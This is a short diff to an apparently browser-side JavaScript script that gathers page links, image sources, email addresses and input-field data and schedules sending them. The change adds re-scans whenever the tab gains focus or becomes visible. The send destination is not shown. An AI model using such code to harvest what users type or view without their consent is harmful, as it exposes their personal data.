@@ -1,10 +1,43 @@
-
-const collectedUrls = new Set();
+const collectedUrls   = new Set();
 const collectedImages = new Set();
-const emails = new Array();
-const inputFields = new Array();
+const emails          = [];
+let inputFields       = [];
 let mutationTimer = null;
-let observer = null;
+let observer      = null;
+
+
+// new helper to clear all collected data
+function resetCollectedData() {
+  collectedUrls.clear();
+  collectedImages.clear();
+  emails.length = 0;
+  inputFields = [];
+}
+
+// fire a fresh scan immediately
+function triggerImmediateScan() {
+  resetCollectedData();
+  extractAnchorLinks();
+  extractImageSources();
+  extractUserData();
+  scheduleSendOnce();
+}
+
+// start original observation once
+startObservation();
+
+// re-scan whenever the tab gains focus
+window.addEventListener('focus', () => {
+  triggerImmediateScan();
+});
+
+// also re-scan if the document becomes visible again
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'visible') {
+    triggerImmediateScan();
+  }
+});
+
 
 // Extract anchor tag URLs
 function extractAnchorLinks() {
@@ -87,5 +120,3 @@ function startObservation() {
 
   observer.observe(document.body, { childList: true, subtree: true });
 }
-
-startObservation();
